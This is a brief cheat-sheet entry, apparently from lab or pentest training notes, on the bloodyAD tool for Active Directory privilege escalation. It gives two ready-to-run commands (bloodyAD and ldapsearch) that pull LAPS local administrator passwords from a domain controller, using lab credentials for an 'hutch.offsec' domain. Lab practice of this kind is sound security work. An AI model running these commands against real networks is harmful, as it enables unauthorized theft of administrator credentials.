 https://www.kali.org/tools/bloodyad/
 
bloodyAD can perform specific LDAP calls to a domain controller in order to perform AD privesc. It supports authentication using cleartext passwords, pass-the-hash, pass-the-ticket or certificates and binds to LDAP services of a domain controller to perform AD privesc.

Exchange of sensitive information without LDAPS is supported. It is also designed to be used transparently with a SOCKS proxy.

```bash
bloodyAD --host 192.168.157.122 -d hutch.offsec -u fmcsorley -p CrabSharkJellyfish192 get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
or 

ldapsearch -x -H ldap://192.168.192.122 -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd